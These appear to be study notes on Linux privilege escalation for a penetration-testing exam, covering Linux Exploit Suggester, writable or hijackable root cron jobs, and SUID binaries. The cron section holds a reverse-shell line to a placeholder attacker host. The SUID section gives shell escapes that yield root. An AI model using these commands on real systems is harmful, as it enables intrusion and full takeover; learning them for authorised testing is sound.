# 🧠 What LES actually does (important)

LES compares the target's kernel version and config against known local privilege escalation exploits.

It answers:
- "Given this kernel, what exploits are worth checking?"

It does NOT:
- Automatically exploit
- Guarantee success
- Bypass security by itself

## 1️⃣ When should you use LES?

Use LES only after:
- You already have a local shell on Linux
- You are non-root
- You want to check for kernel privilege escalation

Typical situation:

```bash
www-data@target:~$
uid=33(www-data)
```

## 2️⃣ Get LES onto the target

### Option A: Already on the system (CTF/labs)

Sometimes it's already present.

### Option B: Download it (most common)

From your attacker machine:

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
```

Transfer it to the target (scp, wget, curl, etc.).

## 3️⃣ Make it executable

On the target:

```bash
chmod +x linux-exploit-suggester.sh
```

## 4️⃣ Run LES (basic usage)

```bash
./linux-exploit-suggester.sh
```

That's it.

LES will automatically:
- Detect kernel version
- Detect architecture
- Detect distro (if possible)
- Match against known exploits

## 5️⃣ Understanding the output (THIS IS KEY)

LES output is divided into sections.

### 🔴 "Highly probable exploits"

These are:
- Kernel version matches exactly
- Exploit is reliable
- Low guesswork

👉 **These are your top priority**

### 🟡 "Probable exploits"

These:
- Kernel version range matches
- Might require specific configs

👉 **Check kernel config before trying**

### ⚪ "Less probable exploits"

These:
- Old
- Unreliable
- Often crash the system

👉 **Usually ignore (especially in exams)**

## 6️⃣ Example of useful LES output (conceptual)

```
[+] Kernel version: 4.4.0-21-generic

Possible exploits:
  - Dirty COW (CVE-2016-5195)
  - OverlayFS privilege escalation
```

This means:
- Your kernel version is vulnerable
- These exploits are worth researching next

## 7️⃣ What to do AFTER LES (very important)

LES is not the final step.

### Correct workflow:

```
LES result
   ↓
Google / search exploit
   ↓
Check kernel version match
   ↓
Check architecture (x86_64 / i386)
   ↓
Compile or run exploit
```

In eJPT-level labs, you're usually expected to:
- Recognize the exploit
- Know it exists
- Maybe run a precompiled one (if provided)

## 8️⃣ Common beginner mistakes

- ❌ Treating LES output as guaranteed
- ❌ Running every exploit listed
- ❌ Ignoring kernel architecture
- ❌ Using kernel exploits when sudo misconfigs exist
- ❌ Causing kernel panic / crash

**Remember:**

**Kernel exploits are last resort.**

## 9️⃣ LES vs other enumeration tools

| Tool | Purpose |
|------|---------|
| Linux Exploit Suggester | Kernel exploits |
| LinPEAS | Full Linux privesc enumeration |
| pspy | Process monitoring |
| sudo -l | Misconfigured sudo |
---
# 🕒 What are cron jobs?

Cron jobs are scheduled tasks on Linux/Unix systems that run automatically at specific times or intervals.

They're managed by the cron daemon (`crond`).

**Think of cron as:**

"Linux Task Scheduler"

## 🧠 What cron jobs are used for (legitimate)

- Backups
- Log rotation
- Updates
- Maintenance scripts
- Monitoring

**Admins often run cron jobs as root.**

## 🧩 How cron jobs are defined

### 1️⃣ Crontab format (important)

```
* * * * * command_to_run
│ │ │ │ │
│ │ │ │ └─ Day of week (0–7)
│ │ │ └─── Month (1–12)
│ │ └───── Day of month (1–31)
│ └─────── Hour (0–23)
└───────── Minute (0–59)
```

### Example

```bash
*/5 * * * * /usr/local/bin/backup.sh
```

➡ Runs every 5 minutes

### 2️⃣ Where cron jobs live (THIS MATTERS FOR ATTACKS)

#### 🔹 User crontabs

```bash
crontab -l
```

Runs as that user.

#### 🔹 System-wide cron directories (HIGH VALUE)

```
/etc/crontab
/etc/cron.d/
/etc/cron.hourly/
/etc/cron.daily/
/etc/cron.weekly/
/etc/cron.monthly/
```

⚠️ **These often run as root.**

## 🔥 Why cron jobs matter in privilege escalation

Cron jobs are dangerous when:
- They run as root
- They execute scripts or binaries
- Those scripts or paths are writable by low-priv users

**That's a direct privilege escalation.**

## 🎯 Common cron job vulnerabilities

### 🔴 1️⃣ Writable script executed by root

Example:

```bash
* * * * * root /opt/backup.sh
```

If `/opt/backup.sh` is writable by you:

```bash
echo "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" >> /opt/backup.sh
```

Next cron run → root shell

### 🔴 2️⃣ Relative paths (PATH hijacking)

Bad cron job:

```bash
* * * * * root backup.sh
```

If cron runs in a directory you control:
- You drop your own `backup.sh`
- Root executes your script

### 🔴 3️⃣ Writable directories in the path

Cron job:

```bash
* * * * * root /usr/bin/python /tmp/script.py
```

If `/tmp/script.py` is writable:
- → Replace it
- → get root

### 🔴 4️⃣ World-writable cron directories (rare but fatal)

If you can write into:

```
/etc/cron.d/
```

You can create:

```bash
* * * * * root bash -c 'id > /root/pwned'
```

Instant root execution.

## 🔍 How to enumerate cron jobs (what YOU should do)

### 1️⃣ List your crontab

```bash
crontab -l
```

### 2️⃣ Check system crontabs

```bash
cat /etc/crontab
```

### 3️⃣ List cron directories

```bash
ls -la /etc/cron.*
```

### 4️⃣ Check permissions (CRITICAL)

```bash
ls -la /path/to/script.sh
```

You are looking for:
- `w` (write) permission
- Owned by root
- Executed by cron

## 🧠 How LinPEAS helps with cron jobs

LinPEAS automatically:
- Finds cron jobs
- Highlights writable scripts in red
- Flags dangerous PATH usage

**That's why cron jobs are a high-priority LinPEAS finding.**

## ❌ Common beginner mistakes

- ❌ Ignoring cron output
- ❌ Not checking file permissions
- ❌ Assuming cron jobs are safe
- ❌ Editing scripts without checking execution context
- ❌ Forgetting cron runs silently

## 🧠 Exam mindset (memorize this)

**If a cron job runs as root and touches a file you can write → you win.**

**This is one of the cleanest Linux privesc paths.**

## TL;DR

- Cron jobs = scheduled tasks
- Often run as root
- Vulnerable if:
  - Script is writable
  - Path is hijackable
- Always enumerate cron jobs
- **Cron privesc > kernel exploits** (safer)
---
# 🔐 What is SUID?

SUID (Set User ID) is a special permission bit on Linux executables.

**When a file has SUID set:**

**The program runs with the permissions of the file owner, not the user who runs it.**

Most of the time, the owner is root.

## 🧠 Why SUID exists (legitimate use)

Some tasks require temporary root privileges, for example:
- Changing your password
- Mounting devices
- Network configuration

### Example:

```
/usr/bin/passwd
```

This binary is SUID-root so normal users can change passwords.

## 📌 How SUID looks in permissions

```bash
ls -l /usr/bin/passwd
```

### Example output:

```
-rwsr-xr-x 1 root root 54256 passwd
```

Notice:

```
rws
```

The `s` in place of `x` means SUID is set.

## 🧩 How SUID works internally

### Normal execution:

```
user → program → user permissions
```

### SUID execution:

```
user → program → OWNER permissions (root)
```

**This is why SUID binaries are high-risk.**

## 🔍 Step 1: Find SUID binaries (first thing attackers do)

```bash
find / -perm -4000 2>/dev/null
```

This lists all SUID executables on the system.

## 🎯 Step 2: Identify dangerous SUID binaries

Most SUID binaries are safe and expected.

You care about:
- Custom binaries
- Scripts
- Rare tools
- Binaries that allow command execution

## 🔥 Common dangerous SUID binaries

| Binary | Why dangerous |
|--------|---------------|
| bash | Gives root shell |
| python | Execute commands as root |
| perl | Execute commands as root |
| find | Can spawn shell |
| vim | Can spawn shell |
| nmap | Interactive shell |
| cp | Overwrite sensitive files |
| less | Shell escape |

## 🧪 Step 3: Exploiting SUID (conceptual)

### Example: SUID `find`

If `find` is SUID-root:

```bash
find . -exec /bin/sh \; -quit
```

Result:

```bash
# whoami
root
```

### Example: SUID `bash`

```bash
bash -p
```

Instant root shell.

## ⚠️ Why SUID scripts are especially dangerous

If a script (shell, Python, Perl) is SUID:
- Linux may ignore SUID on scripts (modern systems)
- But compiled wrappers or misconfigs still exist

**These are severe vulnerabilities.**

## 🧠 How LinPEAS helps with SUID

LinPEAS:
- Lists SUID binaries
- Highlights uncommon ones in red
- Links to known exploitation techniques

**This is why SUID is a top privesc vector.**

## ❌ Common beginner mistakes

- ❌ Exploiting every SUID binary
- ❌ Ignoring ownership
- ❌ Not checking version
- ❌ Forgetting about shell escapes
- ❌ Jumping to kernel exploits too early
